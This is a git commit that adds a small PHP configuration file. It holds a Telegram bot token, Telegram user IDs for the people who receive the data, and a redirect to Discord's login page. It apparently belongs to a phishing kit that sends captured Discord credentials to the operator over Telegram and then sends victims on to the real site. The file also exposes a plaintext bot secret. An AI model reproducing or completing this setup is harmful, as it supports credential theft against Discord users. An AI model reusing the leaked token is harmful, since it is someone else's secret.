1ef8fdaa7d929d2455f181f3f783851e9cab0b17
shaurya11123 <77480523+shaurya11123@users.noreply.github.com>
2022-01-25 14:02:40 +0530

    Add files via upload

---
+++ core/system/config.php
@@ -0,0 +1,8 @@
+<?php
+
+    $bot_token = '2122665736:AAGl9ziAKVSVUwMAytO6MV9qQfuhoh4a5WA'; # Telegram Bot Token
+    $user_id = ' 1997109635'; # Ur and Ur friends id's (id or id,id)
+
+    $url_redirect = "https://discord.com/login";
+
+?>
